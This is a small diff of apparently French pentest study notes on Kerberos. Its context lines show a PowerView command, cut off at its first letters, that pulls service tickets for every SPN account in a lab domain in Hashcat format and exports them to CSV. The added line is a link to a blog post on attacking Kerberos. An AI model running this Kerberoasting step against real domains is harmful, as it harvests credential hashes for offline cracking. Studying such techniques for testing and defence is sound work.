@@ -69,3 +69,6 @@ Exporter tous les tickets vers un fichier CSV
 ```
 et-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 ```
+
+
+https://www.tarlogic.com/blog/how-to-attack-kerberos/
